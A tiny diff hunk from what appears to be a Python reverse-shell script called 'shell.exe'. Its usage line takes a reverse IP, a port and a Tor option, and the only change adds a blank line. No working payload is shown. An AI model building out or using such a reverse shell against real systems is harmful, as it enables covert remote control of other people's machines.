@@ -83,6 +83,7 @@ except IndexError:
 	print "Usage: shell.exe <reverse_ip_address> <port> <tor_mode=yes|no>"
 	sys.exit()
 
+
 # loop forever
 while 1:
 
